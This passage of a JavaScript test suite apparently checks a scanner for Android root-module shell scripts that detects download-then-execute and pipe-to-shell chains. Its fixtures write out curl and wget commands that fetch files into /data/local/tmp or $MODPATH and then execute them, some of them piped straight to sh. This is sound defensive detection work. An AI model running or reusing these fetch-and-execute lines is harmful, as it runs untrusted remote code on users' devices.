  assert.equal(r.decision.action, 'auto-approve', '这一格今天 low、T3 之后仍是 low（工单 §3.9 要求如实列限度）');
});

test('T3.10 负面：sink /data/local/tmp/u 与执行 /data/local/tmp/util 不是同一条链（不许前缀模糊匹配）', async () => {
  const r = await t3scan('eval.t3j', t3body(T3_SHEBANG,
    'curl -s https://x.dev/u -o /data/local/tmp/u',
    'sh /data/local/tmp/util'));
  assert.deepEqual(t3spots(r, 'DOWNLOAD_THEN_EXEC'), [], '前缀相等不等于路径相等');
  assert.deepEqual(t3set(r), ['NETWORK_FETCH/low']);
  assert.equal(r.riskLevel, 'low');
  assert.equal(r.decision.action, 'auto-approve');
});

test('T3.11 负面：-o- / -O - 是标准输出，不立 sink（那一行归 DOWNLOAD_TO_STDOUT）', async () => {
  const r = await t3scan('eval.t3k', t3body(T3_SHEBANG,
    'curl -o- https://dl.static-assets.dev/u',
    'wget -q -O - https://dl.static-assets.dev/u',
    'chmod 700 /data/local/tmp/u',
    '/data/local/tmp/u'));
  assert.deepEqual(t3spots(r, 'DOWNLOAD_THEN_EXEC'), [],
    '标准输出没有落盘点：即使执行路径与被下载内容的 basename 相同也不许配对（不许模糊匹配）');
  assert.deepEqual(t3set(r), ['DOWNLOAD_TO_STDOUT/low', 'DOWNLOAD_TO_STDOUT/low', 'NETWORK_FETCH/low', 'NETWORK_FETCH/low']);
  assert.equal(r.riskLevel, 'low');
  assert.equal(r.decision.action, 'auto-approve');
});

test('T3.12 负面：执行行早于落地行（先 sh 再 curl -o）不许报', async () => {
  const r = await t3scan('eval.t3l', t3body(T3_SHEBANG,
    'sh /data/local/tmp/u',
    'curl -s https://x.dev/u -o /data/local/tmp/u'));
  assert.deepEqual(t3spots(r, 'DOWNLOAD_THEN_EXEC'), [], '链的方向必须是「先落盘、后执行」');
  assert.deepEqual(t3set(r), ['NETWORK_FETCH/low']);
  assert.equal(r.riskLevel, 'low');
  assert.equal(r.decision.action, 'auto-approve');
});

test('T3.13 干净模块哨兵：无下载无执行的模块仍 0 发现 / low / auto-approve（必须带 changeType）', async () => {
  const r = await t3scan('eval.t3m', t3body(T3_SHEBANG,
    'ui_print "- installing"',
    'cp -f busybox $MODPATH/system/xbin/bb',
    'rm -rf $MODDIR/cache'));
  assert.deepEqual(t3set(r), [], '哨兵的精确集合是空集：T3 不许给正经模块新增任何发现');
  assert.equal(r.riskLevel, 'low');
  assert.equal(r.decision.action, 'auto-approve');
});

// —— 共存与去重（工单 §2 的验收判据）——

test('T3 共存：落盘进 $MODPATH 再执行时 DOWNLOAD_THEN_EXEC 与 EXEC_BUNDLED_FILE 都要出（两个事实）', async () => {
  const r = await t3scan('eval.t3n', t3body(T3_SHEBANG,
    'curl -s https://x.dev/run -o $MODPATH/run.bin',
    'chmod 755 $MODPATH/run.bin',
    '$MODPATH/run.bin'));
  assert.deepEqual(t3spots(r, 'DOWNLOAD_THEN_EXEC'), ['service.sh:4/high'], '远程内容落盘后执行');
  assert.deepEqual(t3spots(r, 'EXEC_BUNDLED_FILE'), ['service.sh:4/high'], '包内引用被执行（既有那条不许被摘掉）');
  assert.deepEqual(t3set(r), ['DOWNLOAD_THEN_EXEC/high', 'EXEC_BUNDLED_FILE/high', 'NETWORK_FETCH/low']);
  assert.equal(r.counts.high, 2, '两条 high 各说一件事：这里不许互相吞，也不许叠成三条');
  assert.equal(r.riskLevel, 'high');
  assert.equal(r.decision.action, 'block');
});

test('T3 去重：PIPE_TO_SHELL 与 DOWNLOAD_THEN_EXEC 不叠成两条 high（管道行本身不算执行形态）', async () => {
  const r = await t3scan('eval.t3o', t3body(T3_SHEBANG, 'curl -s https://x.dev/a | sh'));
  const both = r.findings.filter((f) => /PIPE_TO_SHELL|DOWNLOAD_THEN_EXEC/.test(f.ruleId));
  assert.equal(both.length, 1, JSON.stringify(t3set(r)));
  assert.deepEqual(t3spots(r, 'DOWNLOAD_THEN_EXEC'), [], '管道写法没有落盘 sink，本规则在该行不出');
  assert.deepEqual(t3set(r), ['NETWORK_FETCH/low', 'PIPE_TO_SHELL/high']);
  assert.equal(r.riskLevel, 'high');
});

test('T3 去重（文本层硬约束）：执行行同时是 PIPE_TO_SHELL 的命中行时，本规则在那一行让位', () => {
  // 工单 §2：管道那一行本身不算执行形态（`curl … | sh` 没有 sink），两条天然不叠。
  // 这里钉的是那条**硬约束**：一行里既有管道写法、又把已落盘的路径顶在命令位时，只许 PIPE_TO_SHELL 说话。
  const t = t3body(T3_SHEBANG,
    'curl -s https://x.dev/u -o /data/local/tmp/u',
    'curl -s https://x.dev/v | sh; /data/local/tmp/u');
  assert.deepEqual(hits('PIPE_TO_SHELL', t).map((f) => f.line), [3], '夹具必须真的把管道命中造在执行行上');
  assert.deepEqual(t3hits(t), [], '该行是 PIPE_TO_SHELL 的命中行 ⇒ 本规则不出');
  // 同一形状去掉管道写法后必须由本规则说话：证明上面那个 0 是「让位」，不是「没看见这条链」
  assert.deepEqual(t3hits(t3body(T3_SHEBANG,
    'curl -s https://x.dev/u -o /data/local/tmp/u',
    'true; /data/local/tmp/u')), ['3/high']);
});

// —— 写法面（工单 §2 的负面清单逐条）——

test('T3 写法面：-o/--output/-O/-P/--directory-prefix/>/>> 立 sink；-o- / -O - / --output - / 2> / 无 basename 的 -P 都不立', () => {
  const chain = (dl, ex) => t3body(T3_SHEBANG, dl, ex);
  // 立 sink 的写法：落地行 2、执行行 3 ⇒ 1 条
  for (const dl of [
    'curl -s https://x.dev/u -o /data/local/tmp/u',
    'curl -s --output /data/local/tmp/u https://x.dev/u',
    'curl -s https://x.dev/u --output=/data/local/tmp/u',
    'wget -q -O /data/local/tmp/u https://x.dev/u',
    'wget -q -O=/data/local/tmp/u https://x.dev/u',
    'curl -s https://x.dev/u > /data/local/tmp/u',
    'curl -s https://x.dev/u >> /data/local/tmp/u',
  ]) {
    assert.deepEqual(t3hits(chain(dl, 'sh /data/local/tmp/u')), ['3/high'], `应当立 sink：${dl}`);
  }
  for (const [dl, ex] of [
    ['wget -q -P /data/local/tmp https://x.dev/u', 'sh /data/local/tmp/u'],
    ['wget -q --directory-prefix /data/local/tmp https://x.dev/u', 'sh /data/local/tmp/u'],
    ['wget -q -P /data/local/tmp/ https://x.dev/u', 'sh /data/local/tmp/u'],
    ['wget -q -P "/data/local/tmp" "https://x.dev/a/b"', 'sh /data/local/tmp/b'],
  ]) {
    assert.deepEqual(t3hits(chain(dl, ex)), ['3/high'], `-P 的落地路径 = 目录去尾斜杠 + URL basename：${dl}`);
  }
  // 不立 sink 的写法：标准输出、带 fd 的重定向、URL 末段没有 basename
  for (const dl of [
    'curl -o- https://x.dev/u',
    'curl -s -o - https://x.dev/u',
    'curl -s --output - https://x.dev/u',
    'wget -q -O- https://x.dev/u',
    'wget -q -O - https://x.dev/u',
    'curl -s https://x.dev/u 2>/data/local/tmp/u',
  ]) {
    assert.deepEqual(t3hits(chain(dl, 'sh /data/local/tmp/u')), [], `标准输出/带 fd 的重定向不是落盘：${dl}`);
  }
  for (const dl of [
    'wget -q -P /data/local/tmp https://x.dev/',
    'wget -q -P /data/local/tmp https://x.dev',
  ]) {
    assert.deepEqual(t3hits(chain(dl, 'sh /data/local/tmp/payload')), [], `URL 末段没有 basename 时不许猜 sink：${dl}`);
  }
});

test('T3 执行形态：firstToken 是路径本身、或 sh/bash/ash/source/. 的参数；裸 chmod 与 exec/解释器表外的动词都不算执行', () => {
  const dl = 'curl -s https://x.dev/u -o /data/local/tmp/u';
  for (const ex of [
    '/data/local/tmp/u',
    'sh /data/local/tmp/u',
    'bash -x /data/local/tmp/u',
    'ash /data/local/tmp/u',
    '. /data/local/tmp/u',
    'source /data/local/tmp/u',
    'x=1; /data/local/tmp/u',
    'true && /data/local/tmp/u',
  ]) {
    assert.deepEqual(t3hits(t3body(T3_SHEBANG, dl, ex)), ['3/high'], `执行形态应当说话：${ex}`);
  }
  for (const ex of [
    'chmod 700 /data/local/tmp/u',
    'chown 0:0 /data/local/tmp/u',
    'exec /data/local/tmp/u',
    'nohup /data/local/tmp/u &',
    'busybox sh /data/local/tmp/u',
    'ls -l /data/local/tmp/u',
    'ui_print "/data/local/tmp/u"',
    'echo /data/local/tmp/u',
  ]) {
    assert.deepEqual(t3hits(t3body(T3_SHEBANG, dl, ex)), [], `不是本规则承诺的执行形态：${ex}`);
  }
});

test('T3 纯文本判据：注释行里的链不报；跨文件不报（写进已知限度，不许声称覆盖）', () => {
  // 注释里写完一整条链再执行别的东西：注释行不许立 sink，也不许立执行形态
  assert.deepEqual(t3hits(t3body(T3_SHEBANG,
    '# curl -s https://x.dev/u -o /data/local/tmp/u',
    '# /data/local/tmp/u',
    'ui_print ok')), []);
  // 同一篇文本里 sink 与执行分开写在两个文件里 —— 规则只吃单文件文本，跨文件不在能力内
  const one = hits('DOWNLOAD_THEN_EXEC', t3body(T3_SHEBANG, 'curl -s https://x.dev/u -o /data/local/tmp/u'), 'install.sh');
  const other = hits('DOWNLOAD_THEN_EXEC', t3body(T3_SHEBANG, 'sh /data/local/tmp/u'), 'service.sh');
  assert.deepEqual(one.map((f) => f.line), [], 'install.sh 只下载：没有执行行');
  assert.deepEqual(other.map((f) => f.line), [], 'service.sh 只执行：本规则看不到 install.sh 的 sink');
});

test('T3 上限：maxPerFile 与工厂一致（每文件每规则 ≤20 条，按链计），且不按执行形态数放大', () => {
  const lines = [T3_SHEBANG];
  for (let i = 1; i <= 25; i++) {
    lines.push(`curl -s https://x.dev/f${i} -o /data/local/tmp/f${i}`);
    lines.push(`/data/local/tmp/f${i}`);
  }
  const found = hits('DOWNLOAD_THEN_EXEC', lines.join('\n') + '\n');
  assert.equal(found.length, 20, `按链收敛的上限必须是 20，实际 ${found.length}`);
  assert.deepEqual([...new Set(found.map((f) => f.line))].length, 20, '每条是不同的链，不是同一条重复');
});

test('T3 规则自身形状：手写但对外与工厂同形；pattern 是 null（redactText 的 !r.pattern 分支），category 复用 execution', () => {
  const rule = RULES_BY_ID.DOWNLOAD_THEN_EXEC;
  assert.ok(rule, 'DOWNLOAD_THEN_EXEC 必须进 RULES_BY_ID');
  assert.ok(CONTENT_RULES.includes(rule), '不进 CONTENT_RULES 的话 scanContent 根本不会跑它');
  assert.equal(rule.severity, 'high');
  assert.equal(rule.category, 'execution', '不许新造 category（T2 的 policy 桶教训：新桶忘了渲染等于没说过话）');
  assert.equal(rule.anchor, 'anywhere', '跨行规则也要声明锚点，闭包表逐条验');
  assert.equal(rule.pattern, null, '匹配不住在单个正则上：null 是有意为之，redactText 走 if (!r.pattern) continue');
  assert.ok(rule.title && rule.advice, '报告的两个字段都得有');
  assert.equal(CATEGORY_LABEL.execution, '载荷间接执行');
  // snippet 用模块里已有的 trimSnippet：空白压平、超长截尾
  const h = rule.scan('service.sh', t3body(T3_SHEBANG,
    'curl -s   https://x.dev/u -o /data/local/tmp/u',
    'chmod   700 /data/local/tmp/u',
    '/data/local/tmp/u'));
  assert.equal(h.length, 1, JSON.stringify(h));
  assert.equal(h[0].snippet, h[0].snippet.trim());
  assert.ok(!/\s\s/.test(h[0].snippet), `snippet 必须由 trimSnippet 压平：${JSON.stringify(h[0].snippet)}`);
  assert.match(h[0].snippet, /\/data\/local\/tmp\/u/);
  // Finding 形状与工厂逐字段对齐（消息取 title、行号取执行行）
  assert.deepEqual(Object.keys(h[0]).sort(),
    ['advice', 'category', 'file', 'line', 'message', 'ruleId', 'severity', 'snippet'].sort());
  assert.equal(h[0].message, rule.title);
  assert.equal(h[0].line, 4);
  // 纯函数：同输入两次逐字节一致（规则表完整性断言用的是 rm 夹具，这里补跨行链的形态）
  assert.equal(JSON.stringify(rule.scan('x.sh', h[0].snippet)), JSON.stringify(rule.scan('x.sh', h[0].snippet)));
  // 脱敏通道不许因为 pattern:null 崩掉（本规则不是 privacy 类，压根不进 REDACT_RULES）
  assert.equal(typeof redactText(t3body(T3_SHEBANG, 'curl -s https://x.dev/u -o /data/local/tmp/u')), 'string');
});

test('T3 变异防线：链的证据必须同时含落地行与执行行（snippet 里两行都在，缺一行就是报告在说谎）', () => {
  const t = t3body(T3_SHEBANG,
    'curl -s https://x.dev/u -o /data/local/tmp/u',
    'chmod 700 /data/local/tmp/u',
    '/data/local/tmp/u');
  const [f] = hits('DOWNLOAD_THEN_EXEC', t, 'service.sh');
  assert.ok(f, '夹具必须命中，否则下面的断言是空转');
  assert.match(f.snippet, /curl -s https:\/\/x\.dev\/u -o \/data\/local\/tmp\/u/, '落地行的证据要在');
  assert.match(f.snippet, /chmod 700 \/data\/local\/tmp\/u/, 'chmod 作为同一条链的证据进 snippet');
  assert.match(f.snippet, /-> \/data\/local\/tmp\/u/, '执行行的证据要在');
  assert.equal(f.file, 'service.sh');
});

// ===========================================================================
// Task 3.1 —— T3 第二版：写法面放宽（融合短选项簇 / 命令位末段是下载器）、
//              case 标签不立 sink，外加新增的 tree 那一格 DOWNLOAD_TO_MODULE_EXEC。
// ===========================================================================
// 需求来源：工单 `briefs/task-3.1.md` §2/§3 + 计划 §0.18（13 个公开包实测：误伤 0 条，
// 但一条逐字确认存在的真链 0 命中 —— 原因全在写法面）。
//
// 这一节的两条硬规矩（工单 §0/§5，写在这儿是为了让下一轮的人一眼看见）：
//   ① **只动写法面**：路径精确相等、执行晚于落地、禁止模糊匹配这三条判据一个字没松 ——
//      所以每一条「放宽」的夹具旁边都跟着一个「同写法但路径不相等 / 不在相干目录」的反面；
//   ② **误伤 0 条是本轮唯一的资产**：任何一条新形状若在 13 个真包上多咬一口，本轮就是做坏了。
//
// 夹具里的 sink 行是**逐字真包原文**（包名 + 文件:行号写在注释里，`fp-t3/` 在盘上可复验）。
// 只有两种改动是夹具自己的，每一处都在注释里点名改了哪半句：
//   * 补一行「把链补齐」的执行形态 —— 因为 DOWNLOAD_THEN_EXEC 只在**成链**时才出发现，光有 sink 观察不到；
//   * 把位置参数 `$2` 换成可钉住的路径 —— 为了把「命令位」这一半单独拎出来做活体检测。
const T31_SHEBANG = '#!/system/bin/sh';
const t31body = (...lines) => lines.join('\n') + '\n';
/** 新规则的文本层命中（与 t3hits 同口径，只是换成另一条规则）。 */
function t31mod(text, file = 'service.sh') {
  return hits('DOWNLOAD_TO_MODULE_EXEC', text, file).map((f) => `${f.line}/${f.severity}`).sort();
}
/** 老规则的文本层命中。 */
const t31dte = (text, file = 'service.sh') => hits('DOWNLOAD_THEN_EXEC', text, file)
  .map((f) => `${f.line}/${f.severity}`).sort();

// —— §2(a) 融合短选项簇 / 带值连写：立 sink ——

test('T3.1-A1 正面（逐字 sensitive-props customize.sh:207/208 + 215）：-qO / -sLo 融在短选项簇里也要立 sink', () => {
  // sensitive-props-main/customize.sh:207 '    if wget -qO "$MODPATH/resetprop-rs" "$RESETPROP_RS_URL/$RESETPROP_RS_ASSET" 2>/dev/null || \'
  // sensitive-props-main/customize.sh:208 '       curl -sLo "$MODPATH/resetprop-rs" "$RESETPROP_RS_URL/$RESETPROP_RS_ASSET" 2>/dev/null; then'
  // sensitive-props-main/customize.sh:215 '      chmod 755 "$MODPATH/resetprop-rs"'
  // 第 5 行 = 真包 216 行**去掉行首那个 `if`** 的形状：`if` 前缀不在工单授权的三个写法面里
  // （§2(b) 自己拍的硬边界把命令位是 `if` 的那一格挡在外面），这里摘掉它才能单独观察 (a) 这一面。
  const t = t31body(T31_SHEBANG,
    '    if wget -qO "$MODPATH/resetprop-rs" "$RESETPROP_RS_URL/$RESETPROP_RS_ASSET" 2>/dev/null || \\',
    '       curl -sLo "$MODPATH/resetprop-rs" "$RESETPROP_RS_URL/$RESETPROP_RS_ASSET" 2>/dev/null; then',
    '      chmod 755 "$MODPATH/resetprop-rs"',
    '      "$MODPATH/resetprop-rs" -h');
  assert.deepEqual(t31dte(t), ['5/high'],
    '-sLo 认下来之后：sink=208 那一行、执行=第 5 行 ⇒ 一条链（摘掉簇支持时这里必须是 0 —— 变异 (1) 红在这儿）');
  const [f] = hits('DOWNLOAD_THEN_EXEC', t);
  assert.match(f.snippet, /curl -sLo "\$MODPATH\/resetprop-rs"/, 'snippet 必须带 208 那半句逐字原文');
  assert.match(f.snippet, /chmod 755 "\$MODPATH\/resetprop-rs"/, '215 的 chmod 作为同一条链的证据');
});

test('T3.1-A2 正面（逐字 magisk-tailscaled customize.sh:29）：-qO 带值 + 变量拼出的落地路径照样成链', () => {
  // magisk-tailscaled/customize.sh:29 '\twget --no-check-certificate --timeout=100 -qO "$TMPDIR/$FILENAME" "$DOWNLOAD_URL" || {'
  // 执行行是夹具补的（真包把下载的东西 tar -xzf 解开、没有执行那一行 ⇒ 真包本身 0 条，见误伤表）。
  const t = t31body(T31_SHEBANG,
    'wget --no-check-certificate --timeout=100 -qO "$TMPDIR/$FILENAME" "$DOWNLOAD_URL" || {',
    'sh "$TMPDIR/$FILENAME"');
  assert.deepEqual(t31dte(t), ['3/high'], '两侧都写成 $TMPDIR/$FILENAME：精确相等才成链');
  // 同一写法但执行路径只差一个尾段 ⇒ 不许按 basename 或前缀配对（§5 禁止的那三种宽松）
  assert.deepEqual(t31dte(t31body(T31_SHEBANG,
    'wget --no-check-certificate --timeout=100 -qO "$TMPDIR/$FILENAME" "$DOWNLOAD_URL" || {',
    'sh "$TMPDIR/$FILENAME.x"')), [], '路径差一个尾巴就不是同一条链：模糊匹配仍然禁止');
});

test('T3.1-A3 写法面：簇与连写的收口逐字钉死 —— -qO/-sLo/-O<path> 连写收，-sLoo/-qO-/-o/dev/stdout 不收', () => {
  const exec = 'sh /data/local/tmp/u';
  // 收：末位（也是唯一那位）是 o/O 的短选项簇，值在下一个词
  for (const dl of [
    'wget -qO /data/local/tmp/u https://x.dev/u', // sensitive-props:207 / tailscaled:29 / tree:38 / beszel:58
    'curl -sLo /data/local/tmp/u https://x.dev/u', // sensitive-props:208 / beszel:56
    'curl -sL -o /data/local/tmp/u https://x.dev/u', // 既有形状不许回退
    'wget -O /data/local/tmp/u https://x.dev/u',
    'curl -o /data/local/tmp/u https://x.dev/u',
    'curl -s -O=/data/local/tmp/u https://x.dev/u', // 既有 -O= 形状（eq 分支）不许回退
  ]) {
    assert.deepEqual(t31dte(t31body(T31_SHEBANG, dl, exec)), ['3/high'], `簇应当立 sink：${dl}`);
  }
  // 收：值直接粘在选项后面（-o<path> / -O<path>），以及 --output=<path>（既有，别回退）
  for (const dl of [
    'wget -O/data/local/tmp/u https://x.dev/u',
    'curl -o/data/local/tmp/u https://x.dev/u',
    'wget -qO/data/local/tmp/u https://x.dev/u',
    'curl -sLo/data/local/tmp/u https://x.dev/u',
    'curl -s --output=/data/local/tmp/u https://x.dev/u',
  ]) {
    assert.deepEqual(t31dte(t31body(T31_SHEBANG, dl, exec)), ['3/high'], `带值连写应当立 sink：${dl}`);
  }
  // 不收：标准输出形态（真包活样本 Yuri:46 / tailscaled:17 + T3.11 那一族）
  for (const dl of [
    'busybox wget -T 10 --no-check-certificate -qO- "$1"', // 逐字 Yuri customize.sh:46（命令位是 busybox，双重不收）
    'wget --no-check-certificate --timeout=10 -qO- "https://api.github.com/repos/x/y" |', // 逐字 tailscaled:17
    'wget -qO- /data/local/tmp/u https://x.dev/u', // 活体检测：-qO- 之后的路径也不许被当成落盘目标
    'curl -sLo- /data/local/tmp/u https://x.dev/u',
    'curl -o/dev/stdout https://x.dev/u',
    'wget -qO/dev/stdout https://x.dev/u',
    'curl -o- https://x.dev/u',
    'curl -s -o - https://x.dev/u',
    'curl -s --output - https://x.dev/u',
    'wget -q -O - https://x.dev/u',
    'wget -q -O- https://x.dev/u',
    'curl -s https://x.dev/u 2>/data/local/tmp/u',
  ]) {
    assert.deepEqual(t31dte(t31body(T31_SHEBANG, dl, exec)), [], `标准输出不是落盘：${dl}`);
  }
  // 不收：末位不是「唯一那位 o/O」的簇（`-sLoo` 按短选项簇语义，第一个 o 就吃掉余下的一切，见工单 §2(a)）
  for (const dl of [
    'curl -fsSL --connect-timeout 15 https://x.dev/u', // 逐字 AlwaysStrong:84 的选项段
    'wget -q -T 20 https://x.dev/u',
    'curl -sLoo /data/local/tmp/u https://x.dev/u',
  ]) {
    assert.deepEqual(t31dte(t31body(T31_SHEBANG, dl, exec)), [], `不是落盘选项的簇不许被收：${dl}`);
  }
  // 不收：相对路径落地（写法面放宽 ≠ 路径判据放宽 —— 逐字 beszel action.sh:56）
  assert.deepEqual(t31dte(t31body(T31_SHEBANG,
    '        curl -sLo beszel-agent-update.tar.gz "$url" 2>/dev/null',
    'sh beszel-agent-update.tar.gz')), [], '钉不住的相对路径不立 sink：既有口径一字未动');
});

test('T3.1-A4 上限与去重：簇形态的链与既有 -o 形态同表同上限，且一条链只报一次', () => {
  const t = t31body(T31_SHEBANG,
    'wget -qO /data/local/tmp/w https://x.dev/w',
    'curl -sLo /data/local/tmp/w https://x.dev/w',
    'chmod 700 /data/local/tmp/w',
    '/data/local/tmp/w');
  assert.deepEqual(t31dte(t), ['5/high'], '同一个落地路径的两种写法是同一条链：取最早执行行，只出 1 条');
  const lines = [T31_SHEBANG];
  for (let i = 1; i <= 25; i++) {
    lines.push(`wget -qO /data/local/tmp/g${i} https://x.dev/g${i}`);
    lines.push(`/data/local/tmp/g${i}`);
  }
  assert.equal(hits('DOWNLOAD_THEN_EXEC', lines.join('\n') + '\n').length, 20,
    'maxPerFile 的基数还是链、还是 20：写法面放宽不许把上限放大');
});

test('T3.1-A5 反向（Task 3.2 主控裁定并授权改写）：逐字 sensitive-props 207/208/215/216 出一条链 —— 落点是 216', () => {
  // 这一条在上一轮记录的是「三面做完之后仍然 0 命中，挡住的是 216 行行首那个 `if`」（工单 §4.1 的期望值
  // 当时在授权面内做不到，交回主控）。主控在 Task 3.2 拍了裁定并授权把这一条反过来：
  // 共享层的命令位改为「逻辑行里第一个不是 shell 控制词的分词」之后，同一篇逐字原文必须说话。
  // 上一轮留的三条断言的取向因此翻转，其余一字不动 —— 包括那条只删 `if ` 的对照（它现在与主断言同值）。
  const real = [
    T31_SHEBANG,
    '    if wget -qO "$MODPATH/resetprop-rs" "$RESETPROP_RS_URL/$RESETPROP_RS_ASSET" 2>/dev/null || \\',
    '       curl -sLo "$MODPATH/resetprop-rs" "$RESETPROP_RS_URL/$RESETPROP_RS_ASSET" 2>/dev/null; then',
    '      chmod 755 "$MODPATH/resetprop-rs"',
    '      if "$MODPATH/resetprop-rs" -h >/dev/null 2>&1; then'];
  assert.deepEqual(t31dte(t31body(...real)), ['5/high'],
    '整段逐字（真包 sensitive-props customize.sh 207/208/215/216 的原样）：链说话，落点 = 真包 216 那一行');
  assert.deepEqual(t31mod(t31body(...real)), [], 'DOWNLOAD_TO_MODULE_EXEC 仍不报：路径 resetprop-rs 不在模块 system/ 下');
  // sink 那一半仍然是 208 那半句立的（207 的段首是 `if`，本轮没动 dteCollectSinks 的段口径）
  const [f] = hits('DOWNLOAD_THEN_EXEC', t31body(...real));
  assert.equal(f.line, 5, '落点在执行行，不在落地行');
  assert.match(f.snippet, /curl -sLo "\$MODPATH\/resetprop-rs"/, 'snippet 必须带 208 那半句逐字原文');
  // 同一个包的另一篇：action.sh 210/211/218/219 —— 真包差集里的第二条
  assert.deepEqual(t31dte(t31body(T31_SHEBANG,
    '      if wget -qO "$MODPATH/resetprop-rs" "$RESETPROP_RS_URL/$RESETPROP_RS_ASSET" 2>/dev/null || \\',
    '         curl -sLo "$MODPATH/resetprop-rs" "$RESETPROP_RS_URL/$RESETPROP_RS_ASSET" 2>/dev/null; then',
    '        chmod 755 "$MODPATH/resetprop-rs"',
    '        if "$MODPATH/resetprop-rs" -h >/dev/null 2>&1; then'), 'action.sh'), ['5/high'],
    'action.sh:219 那一格同理（真包上一轮差集里的第二条）');
  // 上一轮那条对照留着：只把 216 行行首的 `if ` 摘掉（其余一字不动）⇒ 命中位置不变
  const withoutIf = real.map((l, i) => (i === 4 ? l.replace(/^(\s*)if /, '$1') : l));
  assert.notEqual(withoutIf[4], real[4], '对照必须真的只改了那一个 `if `');
  assert.deepEqual(t31dte(t31body(...withoutIf)), ['5/high'],
    '摘掉 `if ` 与不摘现在给出同一个落点 —— 穿透控制词之后这一格不再是限度');
});

// —— §2(b) 命令位末段是 curl/wget：只多收这一格 ——

test('T3.1-B1 正面（逐字 microG customize.sh:17/27）：$curl 解析后末段是 curl ⇒ 下载段成立', () => {
  // microG-GApps-master/customize.sh:17 '    curl=$MODPATH/tools/curl/arm64eabi-v7a/curl'
  // microG-GApps-master/customize.sh:27 '$curl -o "$MODPATH/system/priv-app/microGServicesCore/base.apk" -k "https://microg.org/fdroid/repo/com.google.android.gms-231657056.apk"'
  // 执行行是夹具补的：真包 microG 不执行 base.apk —— 工单 §2(b) 早写明这一格「不产生新链」。
  const t = t31body(T31_SHEBANG,
    '    curl=$MODPATH/tools/curl/arm64eabi-v7a/curl',
    '$curl -o "$MODPATH/system/priv-app/microGServicesCore/base.apk" -k "https://microg.org/fdroid/repo/com.google.android.gms-231657056.apk"',
    'sh "$MODPATH/system/priv-app/microGServicesCore/base.apk"');
  assert.deepEqual(t31dte(t), ['4/high'], '$curl 解析成 …/curl ⇒ 末段是 curl ⇒ 下载段；两侧路径精确相等 ⇒ 一条链');
  assert.deepEqual(t31mod(t), [], 'apk 没有被 chmod 加执行位 ⇒ §3 那一格不报（两个条件缺一个都不报）');
});

test('T3.1-B2 正面（逐字 Pixelify module/customize.sh:686 的命令位与 URL）：自带二进制 $MODPATH/addon/curl', () => {
  // Pixelify-master/module/customize.sh:686
  //  '                        $MODPATH/addon/curl https://gitlab.com/Kingsman-z/pixelify-files/-/raw/master/asi-new-31.tar.xz -o dp-$API.tar.xz &>/proc/self/fd/$OUTFD'
  // 真包那一条的落盘目标是 `dp-$API.tar.xz`（相对路径，钉不住 ⇒ 不立 sink），所以分两步：
  //   ① 逐字原样 ⇒ 必须 0（这一格的真包现实）；
  //   ② 只把落盘目标换成可钉住的绝对路径 ⇒ 必须 1（否则变异 (2) 无从变红）。
  assert.deepEqual(t31dte(t31body(T31_SHEBANG,
    '                        $MODPATH/addon/curl https://gitlab.com/Kingsman-z/pixelify-files/-/raw/master/asi-new-31.tar.xz -o dp-$API.tar.xz &>/proc/self/fd/$OUTFD',
    'sh dp-$API.tar.xz')), [], '逐字原样：落盘目标是相对路径 ⇒ 两侧都钉不住 ⇒ 0');
  assert.deepEqual(t31dte(t31body(T31_SHEBANG,
    '                        $MODPATH/addon/curl https://gitlab.com/Kingsman-z/pixelify-files/-/raw/master/asi-new-31.tar.xz -o /data/local/tmp/dp.tar.xz &>/proc/self/fd/$OUTFD',
    'sh /data/local/tmp/dp.tar.xz')), ['3/high'],
    '命令位末段是 curl（自带二进制）⇒ 下载段成立（摘掉这一格时这里必须是 0 —— 变异 (2) 红在这儿）');
});

test('T3.1-B3 反向（逐字 Integrity-Box common_func.sh:69 + webroot/UpdateTranslation.sh:56）：$DOWNLOADER 不认 —— 命令替换钉不住是故意的', () => {
  // Integrity-Box/common_func.sh:69               '    DOWNLOADER=$(command -v curl); DL_MODE="curl"; return'
  // Integrity-Box/webroot/UpdateTranslation.sh:56 '            "$DOWNLOADER" -L --fail --connect-timeout 15 --max-time 180 -o "$ZIP_PATH.tmp" "$URL" 2>/dev/null'
  // 另加 13/14/15/16 那四条赋值，让 `$ZIP_PATH.tmp` 是**可钉住**的（钉不住的话这条反向夹具就是空转）；
  // 执行行是夹具补的。工单 §2(b)：这一格明确不修、进已知限度，并且必须配反向夹具。
  const t = t31body(T31_SHEBANG,
    'URL="https://github.com/x/y/releases/download/archive/Canary.zip"',
    'OUT_DIR="/storage/emulated/0/Download/IntegrityModules"',
    'ZIP_NAME="Canary.zip"',
    'ZIP_PATH="$OUT_DIR/$ZIP_NAME"',
    '    DOWNLOADER=$(command -v curl); DL_MODE="curl"; return',
    '            "$DOWNLOADER" -L --fail --connect-timeout 15 --max-time 180 -o "$ZIP_PATH.tmp" "$URL" 2>/dev/null',
    'sh "$ZIP_PATH.tmp"');
  assert.deepEqual(t31dte(t), [],
    '$DOWNLOADER 的末段是 DOWNLOADER 而不是 curl ⇒ 不是下载段；放宽它就是把「谁都能伪装成 wget」写进判据（§0.18 明令禁止）');
});

test('T3.1-B4 反向（逐字 AlwaysStrong keybox_fetch.sh:83）：bounded 90 "$BB" wget 不认 —— 命令位是 bounded', () => {
  // AlwaysStrong/keybox_fetch.sh:83 '        bb)      [ -n "$BB" ] && bounded 90 "$BB" wget -q -T 20 -O "$2" "$3" 2>/dev/null ;;'
  // 这一行上叠着两个理由：命令位是 `bounded`（不是 curl/wget 字面量、末段也不是），以及 sink 是位置参数 `$2`。
  // 工单 §0.18 ① 写的就是「位置参数当 sink：钉不住就不许模糊匹配」。
  const t = t31body(T31_SHEBANG,
    '        bb)      [ -n "$BB" ] && bounded 90 "$BB" wget -q -T 20 -O "$2" "$3" 2>/dev/null ;;',
    'sh /data/local/tmp/kb.bin');
  assert.deepEqual(t31dte(t), [], '命令位是 bounded ⇒ 整段的词全是参数；`$BB` 指向什么是运行期探测出来的，不认');
  // 活体检测：把位置参数换成可钉住的路径（其余一字不动）⇒ 仍然必须 0，红的只能是「命令位」那一半
  assert.deepEqual(t31dte(t31body(T31_SHEBANG,
    '        bb)      [ -n "$BB" ] && bounded 90 "$BB" wget -q -T 20 -O /data/local/tmp/kb.bin "$3" 2>/dev/null ;;',
    'sh /data/local/tmp/kb.bin')), [], '把 $2 换成可钉路径后依旧 0 ⇒ 沉默的原因是命令位，不是位置参数');
});

// —— §2(c) case 标签与命令探测位里的 curl/wget ——

test('T3.1-C1 反向（逐字 AlwaysStrong keybox_fetch.sh:79-88）：curl) / wget) 标签行与 command -v curl 都不立 sink', () => {
  // AlwaysStrong/keybox_fetch.sh:79-88 整段 run_engine（逐字），里面同时有
